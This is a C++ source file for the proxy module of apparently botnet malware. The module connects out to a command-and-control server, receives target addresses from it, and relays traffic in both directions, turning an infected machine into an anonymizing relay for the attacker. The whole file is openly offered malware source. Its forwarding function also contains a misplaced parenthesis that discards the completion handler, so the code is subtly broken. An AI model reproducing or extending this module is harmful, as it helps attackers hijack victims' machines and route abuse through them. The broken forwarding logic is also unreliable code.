#include "ProxyModule.h"
#include "BotLogger.h"
#include <sstream>
#include <regex>
#include <vector>

ProxyModule::ProxyModule()
    : m_io_context(std::make_shared<boost::asio::io_context>()),
      m_c2_socket(*m_io_context), m_resolver(*m_io_context) {}

ProxyModule::~ProxyModule() {
    try {
        m_io_context->stop();
        if (m_worker_thread.joinable()) {
            m_worker_thread.join();
        }
    } catch (const std::exception &e) {
        BotLogger::getInstance().save_exception(e, LogLevel::ERROR, BotModules::PROXY);
    }
}

std::string ProxyModule::get_module_name() const {
    return "proxy";
}

void ProxyModule::execute_module(const nlohmann::json &instructions) {
    m_c2_host = instructions["c2_host"];
    m_c2_port = instructions["c2_port"];

    m_worker_thread = std::thread([this]() {
        try {
            connect_to_c2();
            m_io_context->run();
        } catch (const std::exception &e) {
            BotLogger::getInstance().save_exception(e, LogLevel::ERROR, BotModules::PROXY);
        }
    });
}

void ProxyModule::connect_to_c2() {
    auto endpoints = m_resolver.resolve(m_c2_host, std::to_string(m_c2_port));
    boost::asio::async_connect(m_c2_socket, endpoints,
        [this](const boost::system::error_code &ec, const boost::asio::ip::tcp::endpoint &) {
            if (!ec) {
                BotLogger::getInstance().save_log("Connected to C2 proxy server.", LogLevel::INFO, BotModules::PROXY);
                wait_for_instructions();
            } else {
                BotLogger::getInstance().save_log("Failed to connect to C2 proxy: " + ec.message(), LogLevel::ERROR, BotModules::PROXY);
                // Implement reconnection logic here
            }
        });
}

void ProxyModule::wait_for_instructions() {
    auto header_buf = std::make_shared<std::array<uint8_t, 4>>();
    boost::asio::async_read(m_c2_socket, boost::asio::buffer(*header_buf),
        [this, header_buf](const boost::system::error_code &ec, std::size_t) {
            if (!ec) {
                uint8_t addr_type = (*header_buf)[0];
                uint16_t port = ((*header_buf)[2] << 8) | (*header_buf)[3];
                uint8_t addr_len = (*header_buf)[1];

                auto addr_buf = std::make_shared<std::vector<char>>(addr_len);
                boost::asio::async_read(m_c2_socket, boost::asio::buffer(*addr_buf),
                    [this, addr_buf, port](const boost::system::error_code &ec, std::size_t) {
                        if (!ec) {
                            std::string target_host(addr_buf->begin(), addr_buf->end());
                            establish_target_connection(target_host, port);
                        } else {
                            BotLogger::getInstance().save_log("Failed to read address: " + ec.message(), LogLevel::ERROR, BotModules::PROXY);
                            m_c2_socket.close();
                        }
                    });
            } else {
                BotLogger::getInstance().save_log("Failed to read header: " + ec.message(), LogLevel::ERROR, BotModules::PROXY);
                m_c2_socket.close();
            }
        });
}

void ProxyModule::establish_target_connection(const std::string &target_host, uint16_t target_port) {
    auto target_socket = std::make_shared<boost::asio::ip::tcp::socket>(*m_io_context);
    m_resolver.async_resolve(target_host, std::to_string(target_port),
        [this, target_socket](const boost::system::error_code &ec, boost::asio::ip::tcp::resolver::results_type endpoints) {
            if (!ec) {
                boost::asio::async_connect(*target_socket, endpoints,
                    [this, target_socket](const boost::system::error_code &ec, const boost::asio::ip::tcp::endpoint &) {
                        if (!ec) {
                            // Now that both connections are established, start bidirectional forwarding
                            start_forwarding(m_c2_socket, *target_socket);
                            start_forwarding(*target_socket, m_c2_socket);
                        } else {
                            BotLogger::getInstance().save_log("Failed to connect to target: " + ec.message(), LogLevel::ERROR, BotModules::PROXY);
                            m_c2_socket.close();
                        }
                    });
            } else {
                BotLogger::getInstance().save_log("Failed to resolve target: " + ec.message(), LogLevel::ERROR, BotModules::PROXY);
                m_c2_socket.close();
            }
        });
}

void ProxyModule::start_forwarding(boost::asio::ip::tcp::socket &from, boost::asio::ip::tcp::socket &to) {
    auto buffer = std::make_shared<std::vector<char>>(4096);
    from.async_read_some(boost::asio::buffer(*buffer),
        [this, &from, &to, buffer](const boost::system::error_code &ec, std::size_t length) {
            if (!ec) {
                boost::asio::async_write(to, boost::asio::buffer(*buffer, length)),
                    [this, &from, &to](const boost::system::error_code &ec, std::size_t) {
                        if (!ec) {
                            start_forwarding(from, to);
                        } else {
                            from.close();
                            to.close();
                        }
                    };
            } else {
                from.close();
                to.close();
            }
        });
}